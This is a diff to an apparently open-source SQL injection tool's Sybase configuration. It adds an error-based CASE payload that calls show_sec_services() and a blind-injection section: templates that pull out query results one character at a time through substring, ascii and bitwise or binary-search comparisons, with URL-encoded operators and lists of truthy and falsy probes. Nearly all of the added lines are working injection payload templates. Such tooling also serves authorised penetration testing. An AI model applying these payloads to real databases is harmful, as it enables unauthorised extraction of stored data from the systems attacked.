@@ -132,6 +132,41 @@ strategy:
     - "Sybase: Server message:"
     - Invalid SQL statement or JDBC escape, terminating '
     - sybase
+   vendorSpecific: "'a' = case when ${test} then 'a' else show_sec_services() end"
+
+ binary:
+  test:
+   bit: |
+    0 != ascii(substring(
+        (${injection}),
+        ${window.char},
+        1
+    ))
+    %26${bit}
+   bin: |
+    substring(
+        (${injection}),
+        ${window.char},
+        1
+    )
+    %3E%3Dchar(${mid.int})
+   truthyBin:
+    - char(97)%3E%3Dchar(97)
+    - char(97)%3E%3Dchar(65)
+    - char(97)%3E%3Dchar(48)
+    - char(98)%3E%3Dchar(97)
+    - char(98)%3E%3Dchar(66)
+    - char(49)%3E%3Dchar(48)
+   falsyBin:
+    - char(97)%3E%3Dchar(98)
+    - char(65)%3E%3Dchar(97)
+    - char(66)%3E%3Dchar(98)
+    - char(66)%3E%3Dchar(97)
+    - char(48)%3E%3Dchar(65)
+    - char(48)%3E%3Dchar(49)
+  modeAnd: and
+  modeOr: or
+  blind: ${binary.mode} ${test}
 
  union:
   indices: union select ${result_range} from (${indice_unique}) b
